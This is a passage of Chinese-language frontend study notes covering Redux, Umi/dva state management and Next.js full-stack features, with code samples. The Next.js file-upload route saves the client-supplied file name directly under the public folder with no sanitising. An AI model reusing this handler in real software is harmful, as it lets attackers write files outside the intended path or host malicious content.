一个动作\n\t\t- 发出去的 `action` 需要用 `reducer` 来处理，传入 state 和 action，返回新的 `state`\n\n## 2. 与 Flux 的关系\n\nFlux:\n- 单向数据流\n- 多个 Store\n- Dispatcher 是核心\n- Store 之间可能存在依赖关系\nRedux:\n- 单向数据流\n- 单一 Store：单一的 Store 存储所有状态\n- Reducer 是核心\n- 使用纯函数更新状态\n\nRedux 是 Flux 架构的一个演进和改进版本。它通过引入`单一数据源`、`纯函数更新`和不可变性等概念，使得状态管理更加可预测和易于维护\n\n## 3. Redux 的核心原则\n\n![图片&文件](./files/20241030-6.png)\n\n1. **单一数据源（Single Source of Truth）**\n    - 整个应用的状态存储在单个 store 的对象树中\n    - 使状态可预测且易于调试\n    - 支持服务器端渲染\n2. **状态是只读的（State is Read-only）**\n    - `唯一`改变状态的方式是触发 action\n    - 所有的状态更新都是集中化和顺序化的\n    - 确保视图和网络请求不能直接修改状态\n3. **使用纯函数进行修改（Changes are made with Pure Functions）**\n    - Reducers 必须是纯函数\n    - 给定相同的输入，总是返回相同的输出\n    - 不产生副作用\n\n## 4. Redux 核心概念\n\n### 4.1. 先总结\n\n- createStore\n    - 创建 store 对象，包含 getState、dispatch、subscribe、replaceReducer\n- reducer\n    - 纯函数，接受旧的 state、action，生成新的 state\n- action\n    - 动作，是一个对象，必须包括 type 字段，表示 view 发出通知告诉 store 要改变\n- dispatch\n    - 派发，触发 action ，生成新的 state。是 view 发出 action 的唯一方法\n- subscribe\n    - 订阅，只有订阅了，当派发时，会执行订阅函数\n- combineReducers\n    - 合并 reducer 成一个 reducer\n- replaceReudcer\n    - 代替 reducer 的函数\n- middleware\n    - 中间件，扩展 dispatch 函数\n\n![图片&文件](./files/20241030-7.png)\n\n### 4.2. Store\n\n- 整个应用的状态树\n- 是只读的\n- 只能通过触发 action 来修改\n\n```javascript\nimport { createStore } from 'redux'\nconst store = createStore(reducer)\n```\n\n- 保存状态的容器\n- 提供 `getState()` 方法访问状态\n- 提供 `dispatch(action)` 方法更新状态\n- 提供 `subscribe(listener)` 方法注册监听器\n\n### 4.3. Action\n\n- 描述发生了什么的`普通对象`\n- 必须包含 type 属性\n- 可以携带额外数据\n\n   ```javascript\n// 普通 action\nconst addTodo = {\n type: 'ADD_TODO',\n payload: { text: '学习 Redux' }\n}\n\n// action creator\nconst addTodo = (text) => ({\n type: 'ADD_TODO',\n payload: { text }\n})\n   ```\n\n### 3.4. Reducer\n\n- 指定状态如何变化的纯函数\n- 接收旧状态和 action，返回新状态\n- 不应直接修改旧状态\n\n```javascript\nconst todoReducer = (state = [], action) => {\n switch (action.type) {\n   case 'ADD_TODO':\n\t return [...state, action.payload];\n   case 'REMOVE_TODO':\n\t return state.filter(todo => todo.id !== action.payload.id);\n   default:\n\t return state;\n }\n}\n```\n\n## 5. 基本使用流程\n\n### 5.1. 创建 Store\n\n   ```javascript\n   import { createStore } from 'redux';\n   \n   const store = createStore(reducer);\n   ```\n\n### 5.2. 订阅更新\n\n   ```javascript\n   store.subscribe(() => {\n     console.log('Store updated:', store.getState());\n   });\n   ```\n\n### 5.3. 触发 Action\n\n   ```javascript\n   store.dispatch(addTodo('学习 Redux'));\n   ```\n\n## 6. Redux 工具链\n\n### 6.1. Redux Toolkit（推荐使用）\n\n- 简化样板代码\n- 内置 Immer\n- 更好的开发体验\n\n   ```javascript\n   import { createSlice, configureStore } from '@reduxjs/toolkit';\n\n   const todoSlice = createSlice({\n     name: 'todos',\n     initialState: [],\n     reducers: {\n       addTodo: (state, action) => {\n         state.push(action.payload);\n       },\n       removeTodo: (state, action) => {\n         return state.filter(todo => todo.id !== action.payload.id);\n       }\n     }\n   });\n\n   const store = configureStore({\n     reducer: {\n       todos: todoSlice.reducer\n     }\n   });\n   ```\n\n### 6.2. Redux Middleware\n\n- 处理异步操作\n- 日志记录\n- 错误处理\n\n```javascript\nimport { createStore, applyMiddleware } from 'redux'\nimport thunk from 'redux-thunk'\n\nconst store = createStore(\n  reducer,\n  applyMiddleware(thunk)\n)\n```\n\n#### 6.2.1. 比如日志中间件\n\n   ```javascript\n// 日志中间件示例\nconst logger = store => next => action => {\n\t console.log('dispatching', action);\n\t let result = next(action);\n\t console.log('next state', store.getState());\n\t return result;\n};\n   ```\n\n## 7. 最佳实践\n\n### 7.1. State 结构设计\n\n- 将状态扁平化\n- 避免冗余数据\n- 规范化复杂数据结构\n- 避免冗余数据\n- 合理划分 state 树\n- 使用范式化数据结构\n- 避免深层嵌套\n\n   ```javascript\n   const state = {\n     entities: {\n       todos: {\n         byId: {\n           1: { id: 1, text: '学习 Redux' },\n           2: { id: 2, text: '学习 React' }\n         },\n         allIds: [1, 2]\n       },\n       users: {\n         // ...\n       }\n     },\n     ui: {\n       loading: false,\n       error: null\n     }\n   };\n   ```\n\n### 7.2. Action 设计原则\n\n```javascript\n// 使用 action creator\nconst createUser = (user) => ({\n  type: 'CREATE_USER',\n  payload: user\n})\n\n// 使用常量定义 action types\nconst ActionTypes = {\n  CREATE_USER: 'CREATE_USER',\n  UPDATE_USER: 'UPDATE_USER'\n}\n\n```\n\n   - 使用动词+名词的命名方式\n   - 携带最小必要信息\n   - 使用标准化的结构\n   - 避免在一个 action 中包含多个操作\n   - 保持 action 的原子性\n   - 使用 action creator 统一创建\n   - 考虑使用 action 类型常量\n\n### 7.3. Reducer 设计原则\n\n- 保持纯函数特性\n- 避免副作用\n- 使用 combineReducers 拆分\n- 使用 immer 简化不可变更新\n- 保持纯函数特性\n- 避免修改 state 参数\n- 处理好未知的 action type\n- 合理拆分 reducer\n\n## 8. Redux 原理\n\n### 8.1. 数据流向\n\n- 单向数据流\n- 可预测的状态变化\n- 便于调试和测试\n\n```javascript\nAction -> Dispatcher -> Store -> View\n```\n\n### 8.2. 发布订阅模式\n\n- 通过发布订阅模式实现\n- 状态更新触发监听器\n- 确保状态同步更新\n\n   ```javascript\nfunction createStore(reducer) {\n\t let state;\n\t let listeners = [];\n\t \n\t const getState = () => state;\n\t \n\t const dispatch = (action) => {\n\t   state = reducer(state, action);\n\t   listeners.forEach(listener => listener());\n\t };\n\t \n\t const subscribe = (listener) => {\n\t   listeners.push(listener);\n\t   return () => {\n\t\t listeners = listeners.filter(l => l !== listener);\n\t   };\n\t };\n\t \n\t dispatch({}); // 初始化 state\n\t \n\t return { getState, dispatch, subscribe };\n}\n   ```\n\n### 8.3. 中间件实现原理\n\n   ```javascript\n   function applyMiddleware(...middlewares) {\n     return (createStore) => (reducer, preloadedState) => {\n       const store = createStore(reducer, preloadedState);\n       let dispatch = store.dispatch;\n       \n       const middlewareAPI = {\n         getState: store.getState,\n         dispatch: (action) => dispatch(action)\n       };\n       \n       const chain = middlewares.map(middleware => middleware(middlewareAPI));\n       dispatch = compose(...chain)(store.dispatch);\n       \n       return {\n         ...store,\n         dispatch\n       };\n     };\n   }\n   ```\n\n## 9. 性能优化\n\n### 9.1. Reselect 使用\n\n   ```javascript\n   import { createSelector } from 'reselect';\n\n   const getTodos = state => state.todos;\n   const getFilter = state => state.filter;\n\n   const getVisibleTodos = createSelector(\n     [getTodos, getFilter],\n     (todos, filter) => {\n       switch (filter) {\n         case 'SHOW_COMPLETED':\n           return todos.filter(todo => todo.completed);\n         case 'SHOW_ACTIVE':\n           return todos.filter(todo => !todo.completed);\n         default:\n           return todos;\n       }\n     }\n   );\n   ```\n\n### 9.2. 避免不必要的渲染\n\n   ```javascript\n   // 使用 React.memo 或 shouldComponentUpdate\n   const TodoItem = React.memo(({ todo, onToggle }) => {\n     return (\n       <li onClick={() => onToggle(todo.id)}>\n         {todo.text}\n       </li>\n     );\n   });\n   ```\n\n### 9.3. 其他\n\n- 避免频繁的 `dispatch`\n- 使用 `reselect` 缓存计算结果\n- 避免不必要的组件渲染\n- 合理使用 connect 或 hooks\n- 精细化依赖\n\t- ![图片&文件](./files/20241030-5.png)\n\n## 10. Redux Hooks\n\n### 10.1. useSelector\n\n   ```javascript\n   import { useSelector } from 'react-redux';\n\n   function TodoList() {\n     const todos = useSelector(state => state.todos);\n     return (\n       <ul>\n         {todos.map(todo => (\n           <TodoItem key={todo.id} {...todo} />\n         ))}\n       </ul>\n     );\n   }\n   ```\n\n### 10.2. useDispatch\n\n   ```javascript\n   import { useDispatch } from 'react-redux';\n\n   function AddTodo() {\n     const dispatch = useDispatch();\n     return (\n       <button onClick={() => dispatch(addTodo('新任务'))}>\n         添加任务\n       </button>\n     );\n   }\n   ```\n\n## 11. 调试工具\n\n### 11.1. Redux DevTools\n\n   ```javascript\n   const store = createStore(\n     reducer,\n     window.__REDUX_DEVTOOLS_EXTENSION__ && \n     window.__REDUX_DEVTOOLS_EXTENSION__()\n   );\n   ```\n\n### 11.2. 日志中间件\n\n   ```javascript\n   import { createLogger } from 'redux-logger';\n\n   const store = createStore(\n     reducer,\n     applyMiddleware(createLogger())\n   );\n   ```\n\n## 12. 选择建议\n\n对于小型项目，可能使用 React 的 Context API 或其他更轻量级的状态管理方案会更合适。\n\n## 13. 总结\n\n1. Redux 是状态管理库，也是一个架构\n2. Redux 与 React 无关，但它是为了解决 React 组件中状态无法共享而出的一种解决方案\n3. 单纯的 Redux 只是一个状态机， store 中存放了所有的状态 state，要想改变里面的状态 state，只能 dispatch 一个动作\n4. 发出去的 action 需要用 reducer 来处理，传入 state 和 action，返回新的 state\n5. subscribe 方法可以注册回调方法，当 dispatch action 的时候会执行里面的回调\n6. Redux 其实是一个`发布订阅模式`\n7. Redux 支持 `enhancer`，enhancer 其实就是一个装饰器函数，传入当前的 createStore，返回一个增强的 createStore\n8. Redux 使用 `applyMiddleware` 函数支持中间件，它的返回值其实就是一个 enhancer\n9. Redux 的中间件也是一个装饰器模式，传入当前的 dispatch，返回一个增强了的 dispatch\n10. 单纯的 Redux 是没有 View 层的\n\n## 14. Redux 处理异步接口有多种方案\n\n### 14.1. Redux Thunk\n\n最基础且使用广泛的异步处理方案。\n\n#### 14.1.1. 基本设置\n\n```javascript\n// store.js\nimport { createStore, applyMiddleware } from 'redux';\nimport thunk from 'redux-thunk';\n\nconst store = createStore(rootReducer, applyMiddleware(thunk));\n```\n\n#### 14.1.2. 使用示例\n\n```javascript\n// userActions.js\nconst fetchUserRequest = () => ({ type: 'FETCH_USER_REQUEST' });\nconst fetchUserSuccess = (user) => ({ type: 'FETCH_USER_SUCCESS', payload: user });\nconst fetchUserFailure = (error) => ({ type: 'FETCH_USER_FAILURE', payload: error });\n\n// Thunk action creator\nexport const fetchUser = (userId) => {\n  return async (dispatch, getState) => {\n    try {\n      dispatch(fetchUserRequest());\n      const response = await fetch(`/api/users/${userId}`);\n      const data = await response.json();\n      dispatch(fetchUserSuccess(data));\n    } catch (error) {\n      dispatch(fetchUserFailure(error.message));\n    }\n  };\n};\n\n// userReducer.js\nconst initialState = {\n  loading: false,\n  user: null,\n  error: null\n};\n\nconst userReducer = (state = initialState, action) => {\n  switch (action.type) {\n    case 'FETCH_USER_REQUEST':\n      return { ...state, loading: true };\n    case 'FETCH_USER_SUCCESS':\n      return { loading: false, user: action.payload, error: null };\n    case 'FETCH_USER_FAILURE':\n      return { loading: false, user: null, error: action.payload };\n    default:\n      return state;\n  }\n};\n```\n\n#### 14.1.3. 组件中使用\n\n```javascript\nimport { useEffect } from 'react';\nimport { useDispatch, useSelector } from 'react-redux';\nimport { fetchUser } from './userActions';\n\nfunction UserProfile({ userId }) {\n  const dispatch = useDispatch();\n  const { user, loading, error } = useSelector(state => state.user);\n\n  useEffect(() => {\n    dispatch(fetchUser(userId));\n  }, [dispatch, userId]);\n\n  if (loading) return <div>Loading...</div>;\n  if (error) return <div>Error: {error}</div>;\n  if (!user) return null;\n\n  return <div>{user.name}</div>;\n}\n```\n\n### 14.2. Redux Saga\n\n更强大的异步处理方案，使用 Generator 函数处理复杂的异步流程。\n\n#### 14.2.1. 基本设置\n\n```javascript\n// store.js\nimport { createStore, applyMiddleware } from 'redux';\nimport createSagaMiddleware from 'redux-saga';\nimport rootSaga from './sagas';\n\nconst sagaMiddleware = createSagaMiddleware();\nconst store = createStore(rootReducer, applyMiddleware(sagaMiddleware));\nsagaMiddleware.run(rootSaga);\n```\n\n#### 14.2.2. 使用示例\n\n```javascript\n// userSaga.js\nimport { call, put, takeLatest } from 'redux-saga/effects';\n\nfunction* fetchUser(action) {\n  try {\n    yield put({ type: 'FETCH_USER_REQUEST' });\n    const response = yield call(fetch, `/api/users/${action.payload}`);\n    const data = yield call([response, 'json']);\n    yield put({ type: 'FETCH_USER_SUCCESS', payload: data });\n  } catch (error) {\n    yield put({ type: 'FETCH_USER_FAILURE', payload: error.message });\n  }\n}\n\nexport function* userSaga() {\n  yield takeLatest('FETCH_USER', fetchUser);\n}\n\n// rootSaga.js\nimport { all } from 'redux-saga/effects';\nimport { userSaga } from './userSaga';\n\nexport default function* rootSaga() {\n  yield all([\n    userSaga(),\n  ]);\n}\n```\n\n#### 14.2.3. 组件中使用\n\n```javascript\nfunction UserProfile({ userId }) {\n  const dispatch = useDispatch();\n  const { user, loading, error } = useSelector(state => state.user);\n\n  useEffect(() => {\n    dispatch({ type: 'FETCH_USER', payload: userId });\n  }, [dispatch, userId]);\n\n  // 渲染逻辑...\n}\n```\n\n### 14.3. Redux Toolkit (推荐)\n\nRedux 官方推荐的工具集，简化了 Redux 的使用，内置了 Thunk 中间件。\n\n#### 14.3.1. 基本设置\n\n```javascript\n// store.js\nimport { configureStore } from '@reduxjs/toolkit';\nimport userReducer from './userSlice';\n\nexport const store = configureStore({\n  reducer: {\n    user: userReducer,\n  },\n});\n```\n\n#### 14.3.2. 使用示例\n\n```javascript\n// userSlice.js\nimport { createSlice, createAsyncThunk } from '@reduxjs/toolkit';\n\nexport const fetchUser = createAsyncThunk(\n  'user/fetchUser',\n  async (userId, { rejectWithValue }) => {\n    try {\n      const response = await fetch(`/api/users/${userId}`);\n      const data = await response.json();\n      return data;\n    } catch (error) {\n      return rejectWithValue(error.message);\n    }\n  }\n);\n\nconst userSlice = createSlice({\n  name: 'user',\n  initialState: {\n    loading: false,\n    user: null,\n    error: null,\n  },\n  reducers: {},\n  extraReducers: (builder) => {\n    builder\n      .addCase(fetchUser.pending, (state) => {\n        state.loading = true;\n      })\n      .addCase(fetchUser.fulfilled, (state, action) => {\n        state.loading = false;\n        state.user = action.payload;\n        state.error = null;\n      })\n      .addCase(fetchUser.rejected, (state, action) => {\n        state.loading = false;\n        state.user = null;\n        state.error = action.payload;\n      });\n  },\n});\n\nexport default userSlice.reducer;\n```\n\n#### 14.3.3. 组件中使用\n\n```javascript\nimport { useEffect } from 'react';\nimport { useDispatch, useSelector } from 'react-redux';\nimport { fetchUser } from './userSlice';\n\nfunction UserProfile({ userId }) {\n  const dispatch = useDispatch();\n  const { user, loading, error } = useSelector(state => state.user);\n\n  useEffect(() => {\n    dispatch(fetchUser(userId));\n  }, [dispatch, userId]);\n\n  // 渲染逻辑...\n}\n```\n\n### 14.4. 最佳实践建议\n\n1. **选择合适的方案**\n   - 简单项目：Redux Toolkit\n   - 复杂异步流程：Redux Saga\n   - 特殊需求：考虑 Redux Observable\n\n2. **错误处理**\n```javascript\n// 统一的错误处理\nconst handleApiError = (error) => {\n  if (error.response?.status === 401) {\n    // 处理未授权\n    dispatch(logout());\n  }\n  return error.message;\n};\n\n// 在异步 action 中使用\nexport const fetchUser = createAsyncThunk(\n  'user/fetchUser',\n  async (userId, { rejectWithValue }) => {\n    try {\n      const response = await fetch(`/api/users/${userId}`);\n      const data = await response.json();\n      return data;\n    } catch (error) {\n      return rejectWithValue(handleApiError(error));\n    }\n  }\n);\n```\n\n3. **Loading 状态管理**\n```javascript\n// 创建通用的 loading selector\nconst createLoadingSelector = (actions) => (state) => \n  actions.some(action => state.loading[action]);\n\n// 使用\nconst isLoading = useSelector(createLoadingSelector(['FETCH_USER', 'FETCH_POSTS']));\n```\n\n4. **请求缓存**\n```javascript\n// 缓存管理\nconst userSlice = createSlice({\n  name: 'user',\n  initialState: {\n    cache: {},\n    ttl: 5 * 60 * 1000, // 5分钟缓存\n  },\n  reducers: {\n    updateCache: (state, action) => {\n      state.cache[action.payload.id] = {\n        data: action.payload.data,\n        timestamp: Date.now(),\n      };\n    },\n  },\n});\n\n// 使用缓存\nexport const fetchUserWithCache = createAsyncThunk(\n  'user/fetchWithCache',\n  async (userId, { getState, dispatch }) => {\n    const state = getState();\n    const cached = state.user.cache[userId];\n    \n    if (cached && Date.now() - cached.timestamp < state.user.ttl) {\n      return cached.data;\n    }\n    \n    const response = await fetch(`/api/users/${userId}`);\n    const data = await response.json();\n    dispatch(userSlice.actions.updateCache({ id: userId, data }));\n    return data;\n  }\n);\n```\n\n5. **取消请求**\n```javascript\n// Redux Toolkit 方式\nexport const fetchUser = createAsyncThunk(\n  'user/fetchUser',\n  async (userId, { signal }) => {\n    const response = await fetch(`/api/users/${userId}`, { signal });\n    const data = await response.json();\n    return data;\n  }\n);\n\n// 组件中使用\nuseEffect(() => {\n  const promise = dispatch(fetchUser(userId));\n  return () => {\n    promise.abort();\n  };\n}, [userId]);\n```\n\n6. **TypeScript 支持**\n```typescript\n// 定义类型\ninterface User {\n  id: number;\n  name: string;\n}\n\ninterface UserState {\n  loading: boolean;\n  user: User | null;\n  error: string | null;\n}\n\n// 在 slice 中使用\nconst userSlice = createSlice({\n  name: 'user',\n  initialState: {\n    loading: false,\n    user: null,\n    error: null,\n  } as UserState,\n  // ...\n});\n```\n\n这些方案各有特点，建议：\n- 新项目优先使用 Redux Toolkit\n- 需要处理复杂异步流程时考虑 Redux Saga\n- 注意做好错误处理和加载状态管理\n- 适当使用缓存优化性能\n- 考虑请求取消的场景\n- 使用 TypeScript 增加类型安全","F9T5Fosv":"\n# umi 的数据流方案\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- dva\n- ==hooks 数据流==，最新的数据流方案\n\t- 和 vue3 pinia(组合式) 其实很像\n\n## 2. Umi 如何管理状态\n\n![图片&文件](./files/20241030-9.png)\n\n### 2.1. 定义示例\n\n```javascript\nimport React, { Component } from \"react\";\nimport { connect } from \"umi\";\n\n@connect(({ user }) => ({\n  user,\n}))\nclass UserInfo extends Component {\n  constructor(props) {\n    super(props);\n  }\n  render() {\n    return <div>{this.props.user.name}</div>;\n  }\n}\n\nexport default UserInfo;\n\n```\n\n### 2.2. 使用示例\n\n```javascript hl:4\nimport React, { Component } from \"react\";\nimport { connect } from \"umi\";\n\n@connect(({ user }) => ({\n  user,\n}))\nclass UserInfo extends Component {\n  constructor(props) {\n    super(props);\n  }\n  render() {\n    return <div>{this.props.user.name}</div>;\n  }\n}\n\nexport default UserInfo;\n\n```\n\n## 3. 最新的 Hooks 数据流\n\n![图片&文件](./files/20241030-10.png)\n\n### 3.1. counterModel\n\n```javascript\n// src/models/counterModel.ts\nimport { useState, useCallback } from \"react\";\n\nexport default function Page() {\n  const [counter, setCounter] = useState(0);\n\n  const increment = useCallback(() => setCounter((c) => c + 1), []);\n  const decrement = useCallback(() => setCounter((c) => c - 1), []);\n\n  return { counter, increment, decrement };\n}\n\n```\n\n### 3.2. 请求数据\n\n```javascript\n// src/models/userModel.ts\nimport { useState } from \"react\";\nimport { getUser } from \"@/services/user\";\n\nexport default function Page() {\n  const [user, setUser] = useState({});\n  const [loading, setLoading] = useState(true);\n\n  useEffect(() => {\n    getUser().then((res) => {\n      setUser(res);\n      setLoading(false);\n    });\n  }, []);\n\n  return {\n    user,\n    loading,\n  };\n}\n\n```\n\n### 3.3. 和 Vue3 的 pinia\n\n是不是特别像，除了支持放到 pages 下的 model 管理\n\n## 4. Dva \n\n![图片&文件](./files/20241030-8.png)\n\n- namespace\n    - model 的命名空间，同时也是他在全局 state 上的属性，只能用字符串，不支持通过 `.` 的方式创建多层命名空间\n- state\n    - 初始值\n- reducers\n    - 纯函数，以 key/value 格式定义 reducer。用于处理同步擦做，唯一可以修改 `state` 的地方，由 `action` 触发\n    - 格式为：`(state, action) => newState` 或 `[(state, action) => newState, enhancer]`\n- effects\n    - 处理异步操作和业务逻辑，以 `key/value` 格式定义 effect\n    - 不直接修改 state。由 action 触发\n    - call：\n        - 执行异步操作\n    - put：\n        - 发出一个 Action，类似于 dispatch\n- subscriptions\n    - 订阅\n    - 在 `app.start()` 时被执行，数据源可以是当前的时间、服务器的 websocket 链接、 keyboard 输入、history 路由变化、geolocation 变化等等\n\n```javascript\nimport React, { Component } from \"react\";\nimport { connect } from \"umi\";\n\nconst mapModelToProps = (allModels) => {\n  return {\n    test: \"hello world\",\n    // props you want connect to Component\n  };\n};\n\n@connect(mapModelToProps)\nclass UserInfo extends Component {\n  render() {\n    return <div>{this.props.test}</div>;\n  }\n}\n\nexport default UserInfo;\n\n```\n","gjkXTDBM":"\n# Next.js\n\n`#react`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- Next.js 是一个基于 React 的`全栈 Web 应用开发框架`\n- 支持多少渲染方式\n\t- ssr ssg isr csr\n- 文件路径 → 路由\n- 底层技术栈\n\t- turbopack\n\t- swc\n\n## 2. 基本定义\n\nNext.js 是一个基于 React 的`全栈 Web 应用开发框架`，它提供了构建现代网络应用所需的所有功能。它是由 Vercel 公司开发和维护的开源框架。\n\n## 3. 核心特性\n\n### 3.1. 渲染方式\n\n- 服务器端渲染 (SSR)\n- 静态站点生成 (SSG)\n- 增量静态再生成 (ISR)\n- 客户端渲染 (CSR)\n\n### 3.2. 路由系统\n\n- 基于文件系统的路由\n- 动态路由支持\n- App Router（最新稳定版特性）\n- 嵌套路由和布局\n\n### 3.3. 性能优化\n\n- 自动代码分割\n- 图片优化\n- 字体优化\n- 脚本优化\n\n## 4. 主要优势\n\n- 零配置：提供开箱即用的配置\n- SEO 友好：得益于服务器端渲染\n- 开发体验佳：支持热模块替换（HMR）\n- 内置 API 路由：支持全栈开发\n- TypeScript 支持\n- 自动优化和性能提升\n\n## 5. Next.js 的全栈开发能力\n\n### 5.1. API 路由实现\n\n```typescript\n// app/api/users/route.ts\nimport { NextResponse } from 'next/server'\nimport { prisma } from '@/lib/prisma'  // 假设使用 Prisma 作为 ORM\n\nexport async function GET() {\n    const users = await prisma.user.findMany()\n    return NextResponse.json(users)\n}\n\nexport async function POST(request: Request) {\n    const data = await request.json()\n    const user = await prisma.user.create({\n        data: {\n            name: data.name,\n            email: data.email\n        }\n    })\n    return NextResponse.json(user)\n}\n```\n\n### 5.2. 数据库集成\n\n```typescript\n// lib/prisma.ts\nimport { PrismaClient } from '@prisma/client'\n\nconst prisma = new PrismaClient()\nexport { prisma }\n\n// schema.prisma\ndatasource db {\n    provider = \"postgresql\"\n    url      = env(\"DATABASE_URL\")\n}\n\nmodel User {\n    id        Int      @id @default(autoincrement())\n    name      String\n    email     String   @unique\n    posts     Post[]\n}\n```\n\n### 5.3. 服务器组件中的数据获取\n\n```typescript\n// app/users/page.tsx\nimport { prisma } from '@/lib/prisma'\n\n// 服务器组件\nexport default async function UsersPage() {\n    // 直接在服务器端获取数据\n    const users = await prisma.user.findMany({\n        include: {\n            posts: true\n        }\n    })\n\n    return (\n        <div>\n            {users.map(user => (\n                <div key={user.id}>\n                    <h2>{user.name}</h2>\n                    <p>{user.email}</p>\n                    <h3>Posts:</h3>\n                    <ul>\n                        {user.posts.map(post => (\n                            <li key={post.id}>{post.title}</li>\n                        ))}\n                    </ul>\n                </div>\n            ))}\n        </div>\n    )\n}\n```\n\n### 5.4. 中间件实现\n\n```typescript\n// middleware.ts\nimport { NextResponse } from 'next/server'\nimport type { NextRequest } from 'next/server'\n\nexport function middleware(request: NextRequest) {\n    // 获取 token\n    const token = request.cookies.get('token')\n\n    // 保护 API 路由\n    if (request.nextUrl.pathname.startsWith('/api/')) {\n        if (!token) {\n            return NextResponse.json(\n                { error: 'Authentication required' },\n                { status: 401 }\n            )\n        }\n    }\n\n    return NextResponse.next()\n}\n```\n\n### 5.5. 全栈数据验证\n\n```typescript\n// lib/validations.ts\nimport { z } from 'zod'\n\nexport const userSchema = z.object({\n    name: z.string().min(2),\n    email: z.string().email(),\n    password: z.string().min(6)\n})\n\n// app/api/register/route.ts\nimport { userSchema } from '@/lib/validations'\n\nexport async function POST(request: Request) {\n    try {\n        const data = await request.json()\n        const validated = userSchema.parse(data)\n        \n        // 处理验证后的数据\n        const user = await prisma.user.create({\n            data: validated\n        })\n        \n        return NextResponse.json(user)\n    } catch (error) {\n        return NextResponse.json(\n            { error: 'Validation failed' },\n            { status: 400 }\n        )\n    }\n}\n```\n\n### 5.6. 服务器端状态管理\n\n```typescript\n// app/actions.ts\n'use server'\n\nexport async function createPost(formData: FormData) {\n    const title = formData.get('title')\n    const content = formData.get('content')\n    \n    const post = await prisma.post.create({\n        data: {\n            title: title as string,\n            content: content as string\n        }\n    })\n    \n    return post\n}\n\n// app/new-post/page.tsx\nimport { createPost } from '../actions'\n\nexport default function NewPostPage() {\n    return (\n        <form action={createPost}>\n            <input name=\"title\" type=\"text\" />\n            <textarea name=\"content\" />\n            <button type=\"submit\">Create Post</button>\n        </form>\n    )\n}\n```\n\n### 5.7. 认证集成\n\n```typescript\n// app/api/auth/[...nextauth]/route.ts\nimport NextAuth from 'next-auth'\nimport { PrismaAdapter } from '@auth/prisma-adapter'\nimport GitHubProvider from 'next-auth/providers/github'\nimport { prisma } from '@/lib/prisma'\n\nconst handler = NextAuth({\n    adapter: PrismaAdapter(prisma),\n    providers: [\n        GitHubProvider({\n            clientId: process.env.GITHUB_ID!,\n            clientSecret: process.env.GITHUB_SECRET!,\n        }),\n    ],\n    callbacks: {\n        async session({ session, user }) {\n            session.user.id = user.id\n            return session\n        }\n    }\n})\n\nexport { handler as GET, handler as POST }\n```\n\n### 5.8. 文件上传处理\n\n```typescript\n// app/api/upload/route.ts\nimport { writeFile } from 'fs/promises'\nimport { NextResponse } from 'next/server'\n\nexport async function POST(request: Request) {\n    const formData = await request.formData()\n    const file = formData.get('file') as File\n    \n    if (!file) {\n        return NextResponse.json(\n            { error: 'No file uploaded' },\n            { status: 400 }\n        )\n    }\n\n    const bytes = await file.arrayBuffer()\n    const buffer = Buffer.from(bytes)\n    \n    const path = `/uploads/${file.name}`\n    await writeFile(`public${path}`, buffer)\n    \n    return NextResponse.json({ path })\n}\n```\n\n### 5.9. WebSocket 集成\n\n```typescript\n// app/api/socket/route.ts\nimport { createServer } from 'http'\nimport { Server } from 'socket.io'\n\nconst httpServer = createServer()\nconst io = new Server(httpServer, {\n    cors: {\n        origin: process.env.NEXT_PUBLIC_URL\n    }\n})\n\nio.on('connection', (socket) => {\n    console.log('Client connected')\n    \n    socket.on('message', (data) => {\n        io.emit('message', data)\n    })\n})\n\nhttpServer.listen(3001)\n```\n\n### 5.10. 环境变量和配置管理\n\n```env\n# .env.local\nDATABASE_URL=\"postgresql://...\"\nGITHUB_ID=\"...\"\nGITHUB_SECRET=\"...\"\nNEXT_PUBLIC_API_URL=\"...\"\n```\n\n这些示例展示了 Next.js 的全栈能力，包括：\n- API 路由处理\n- 数据库操作\n- 服务器端渲染\n- 文件处理\n- 认证授权\n- 实时通信\n- 中间件\n- 数据验证\n- 服务器端状态管理\n- 环境配置\n\n建议根据项目需求逐步整合这些功能，不必一次性实现所有特性。从基本的 API 路由和数据库操作开始，然后根据需要添加更多功能。\n\n## 6. Next.js 的底层技术栈\n\n### 6.1. 核心编译和构建工具\n\n#### 6.1.1. SWC (Speedy Web Compiler)\n\n- 用 Rust 编写的高性能 JavaScript/TypeScript 编译器\n- 替代了传统的 Babel\n- 提供代码转换和压缩功能\n- 比 Babel 快 17 倍以上 \n\n#### 6.1.2. Turbopack\n\n- Next.js 13 引入的新一代打包工具\n- 同样使用 Rust 编写\n- 比 Webpack 快 700 倍\n- 支持增量编译\n\n### 6.2. 运行时核心\n\n#### 6.2.1. React 核心\n\n- 完全集成 React 18\n- 支持服务器组件（React Server Components）\n- 支持并发渲染\n- 支持 Suspense 和流式渲染 \n\n#### 6.2.2. 渲染引擎\n\n- 支持服务器端渲染（SSR）\n- 静态网站生成（SSG）\n- 增量静态再生成（ISR）\n- 客户端渲染（CSR）\n\n### 6.3. 数据层支持\n\n#### 6.3.1. 数据获取\n\n- fetch API\n- React Query/SWR 集成\n- GraphQL 支持\n- REST API 支持 \n\n#### 6.3.2. 数据库集成\n\n- Prisma\n- MongoDB\n- PostgreSQL\n- MySQL\n- SQLite\n\n### 6.4. 性能优化工具\n\n#### 6.4.1. 图像优化\n\n- 内置图像组件\n- 自动图像优化\n- WebP 支持\n- 响应式图像处理\n\n#### 6.4.2. 字体优化\n\n- 内置字体系统\n- 自动字体优化\n- 变体字体支持\n- 本地字体加载\n\n### 6.5. 开发工具集成\n\n#### 6.5.1. TypeScript\n\n- 原生 TypeScript 支持\n- 类型检查\n- 智能提示\n- 自动类型生成\n\n#### 6.5.2. ESLint\n\n- 内置 ESLint 配置\n- 代码质量检查\n- 最佳实践强制执行\n\n### 6.6. 路由系统\n\n#### 6.6.1. 文件系统路由\n\n- 基于文件的路由系统\n- 动态路由支持\n- 嵌套路由\n- 平行路由\n\n#### 6.6.2. 中间件\n\n- 路由中间件\n- 认证中间件\n- 重定向处理\n- 请求拦截\n\n### 6.7. 样式解决方案\n\n#### 6.7.1. CSS 支持\n\n- CSS Modules\n- Sass/SCSS\n- PostCSS\n- Tailwind CSS \n\n#### 6.7.2. CSS-in-JS\n\n- styled-components\n- emotion\n- CSS Modules\n- 注意：部分 CSS-in-JS 解决方案在服务器组件中可能受限\n\n### 6.8. 安全特性\n\n#### 6.8.1. 内置安全措施\n\n- CSRF 保护\n- XSS 防护\n- CSP 支持\n- 请求验证\n\n#### 6.8.2. 认证集成\n\n- NextAuth.js\n- JWT\n- Session 管理\n- OAuth 提供商支持\n\n### 